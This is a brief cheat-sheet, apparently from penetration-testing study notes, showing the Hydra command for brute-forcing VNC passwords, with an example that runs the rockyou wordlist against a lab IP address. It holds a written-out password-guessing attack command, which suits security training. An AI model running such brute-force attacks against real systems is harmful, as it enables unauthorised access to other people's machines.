# Hydra - VNC

```
hydra -P [WORDLIST] [TARGET-IP] vnc
```
Example:
```
hydra -P /usr/share/wordlists/rockyou.txt 10.10.227.171 vnc
```
* VNC does not use usernames
* You can use -V or -vV for verbose output
